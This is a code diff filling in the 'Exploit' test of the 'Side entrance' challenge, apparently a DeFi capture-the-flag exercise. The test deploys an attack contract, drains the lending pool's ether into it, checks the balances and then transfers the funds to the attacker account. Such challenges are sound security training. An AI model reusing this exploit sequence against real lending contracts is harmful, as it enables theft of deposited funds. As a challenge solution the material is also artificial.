@@ -24,7 +24,16 @@ describe('[Challenge] Side entrance', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        const SideEntranceAttackFactory= await ethers.getContractFactory('SideEntranceAttack', attacker);
+        const exploit = await SideEntranceAttackFactory.deploy()
+        await exploit.attack(this.pool.address);
+        console.log('Now attacker contract has its balance maxed out, let`s transfer it to the attacker')
+        
+        console.log('Checking ...', );
+        expect((await this.pool.balances(exploit.address)).toString()).to.equal(ETHER_IN_POOL);
+        await exploit.transferToAttacker(attacker.address,this.pool.address);
+        
+        expect((await this.pool.balances(exploit.address)).toString()).to.equal('0');
     });
 
     after(async function () {
